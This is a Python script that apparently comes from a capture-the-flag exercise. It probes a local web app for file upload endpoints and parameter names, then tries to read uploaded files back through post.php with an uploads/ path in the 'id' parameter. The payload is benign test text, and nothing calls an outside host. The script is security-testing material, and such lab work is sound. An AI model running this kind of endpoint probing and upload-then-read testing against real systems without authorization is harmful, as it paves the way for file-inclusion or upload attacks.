import requests
import re

base_url = "http://127.0.0.1:32891"

print("[+] Testing file upload capabilities...")

# Try uploading a file to various endpoints
test_file_content = "TEST_FILE_CONTENT_FOR_FLAG_SEARCH"
files = {'file': ('test.txt', test_file_content, 'text/plain')}

endpoints_to_test = [
    "/upload",
    "/upload.php",
    "/post.php",
    "/index.php",
    "/api/upload",
    "/admin/upload",
]

for endpoint in endpoints_to_test:
    print(f"\n[+] Testing: {endpoint}")
    
    # Try POST with file
    try:
        resp = requests.post(f"{base_url}{endpoint}", files=files)
        print(f"  Status: {resp.status_code} | Length: {len(resp.text)}")
        
        if resp.status_code != 404 and len(resp.text) > 0:
            print(f"  Response preview: {resp.text[:200]}")
            
            # Look for success indicators or file IDs
            id_match = re.search(r'id[=:]\s*["\']?([a-zA-Z0-9_-]+)["\']?', resp.text)
            if id_match:
                file_id = id_match.group(1)
                print(f"  [!] Possible file ID: {file_id}")
                
                # Try to read it back
                read_resp = requests.get(f"{base_url}/post.php", params={'id': f'uploads/{file_id}'})
                if test_file_content in read_resp.text:
                    print(f"  [!!!] Successfully uploaded and read back file!")
                    print(f"  File accessible at: uploads/{file_id}")
    except Exception as e:
        print(f"  Error: {e}")

# Try POST with different parameter names
print("\n\n[+] Testing POST to post.php with various parameters...")
test_params = ['file', 'upload', 'document', 'attachment', 'content', 'data']

for param in test_params:
    data = {param: test_file_content}
    resp = requests.post(f"{base_url}/post.php", data=data)
    
    if len(resp.text) != 8245:  # Different from default ScriptKiddie response
        print(f"\n[!] Parameter '{param}' produced different response")
        print(f"  Status: {resp.status_code} | Length: {len(resp.text)}")
        print(f"  Preview: {resp.text[:200]}")

# Try multipart upload to post.php
print("\n[+] Testing multipart upload to post.php...")
files = {'upload': ('test.txt', test_file_content)}
resp = requests.post(f"{base_url}/post.php", files=files)
print(f"Status: {resp.status_code} | Length: {len(resp.text)}")
if len(resp.text) != 8245:
    print(f"Different response! Preview: {resp.text[:300]}")

